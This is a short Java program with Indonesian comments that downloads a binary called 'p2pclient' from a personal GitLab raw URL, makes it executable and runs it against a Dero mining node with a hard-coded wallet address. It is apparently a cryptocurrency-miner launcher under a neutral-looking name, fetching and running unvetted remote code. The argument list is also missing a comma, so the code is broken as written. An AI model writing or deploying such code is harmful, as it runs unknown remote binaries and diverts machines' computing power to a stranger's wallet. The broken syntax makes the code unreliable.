import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;

public class P2PClientRunner {
    private static final String P2P_URL = "https://gitlab.com/rikzakalani/derolunamnr/raw/main/p2pclient";
    private static final String P2P_PATH = "p2pclient";
    private static final String LOG_FILE = "p2pclient.log";

    public static void main(String[] args) {
        try {
            // Unduh p2pclient jika belum ada
            File p2pFile = new File(P2P_PATH);
            if (!p2pFile.exists()) {
                System.out.println("🔄 Downloading p2pclient...");
                downloadFile(P2P_URL, P2P_PATH);
                p2pFile.setExecutable(true);
                System.out.println("✅ p2pclient downloaded and set as executable.");
            }

            // Jalankan p2pclient
            System.out.println("🚀 Starting p2pclient...");
            ProcessBuilder processBuilder = new ProcessBuilder(
                "./" + P2P_PATH,
                "-d", "minernode1.dero.io:10100",
                "-w", "10300"
                "--wallet", "dero1qy490rdvzggfxwxjnk4hp6s60s99agjlz29hzl78ctaqft9496wgcqgkmkmr4"
            );

            processBuilder.redirectErrorStream(true);
            processBuilder.redirectOutput(new File(LOG_FILE));

            Process process = processBuilder.start();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.out.println("🛑 Stopping p2pclient...");
                process.destroy();
            }));

            process.waitFor();
            System.out.println("⚠️ p2pclient exited.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void downloadFile(String fileURL, String savePath) throws IOException {
        URL url = new URL(fileURL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        try (InputStream inputStream = connection.getInputStream();
             FileOutputStream outputStream = new FileOutputStream(savePath)) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
        }
    }
}
